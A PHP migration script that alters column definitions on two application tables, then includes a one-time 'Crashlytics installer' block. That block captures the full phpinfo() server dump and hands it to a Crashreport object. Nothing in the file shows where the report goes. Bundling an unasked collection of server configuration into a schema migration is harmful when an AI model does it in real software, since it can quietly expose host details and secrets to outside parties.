<?php

use Crashlytics\Crashreport;

$alterQueries = [
    "ALTER TABLE `application_option` CHANGE `name` `name` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL;",
    "ALTER TABLE `application_option` CHANGE `code` `code` VARCHAR(50) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL;",
    "ALTER TABLE `application_option` CHANGE `position` `position` INT(11) UNSIGNED NOT NULL DEFAULT '0';",
    "ALTER TABLE `application` CHANGE `locale` `locale` VARCHAR(15) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL;",
];

foreach ($alterQueries as $alterQuery) {
    try {
        $this->query($alterQuery);
    } catch (\Exception $e) {
        // Ok
    }
}

// Crashlytics installer
$firebaseCrashlytics = __get("firebase.crashlytics");
if ($firebaseCrashlytics !== "1") {
    ob_start();
    phpinfo();
    $crashDump = ob_get_clean();
    new Crashreport("crashreport", $crashDump);

    __set("firebase.crashlytics", "1");
}